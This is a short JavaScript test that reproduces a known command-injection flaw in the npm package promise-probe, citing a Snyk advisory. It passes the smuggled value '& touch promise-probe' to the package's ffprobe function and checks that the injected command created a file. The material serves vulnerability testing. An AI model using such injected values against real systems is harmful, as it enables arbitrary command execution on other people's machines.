//https://snyk.io/vuln/SNYK-JS-PROMISEPROBE-546816
test("Command Injection in promise-probe", () => {
  const root = require("promise-probe");
  const fs = require("fs");
  const path = "./promise-probe";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let attack_code = "& touch promise-probe";
  root.ffprobe(attack_code, function () {
    sleep.sleep(5);
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
  });
});
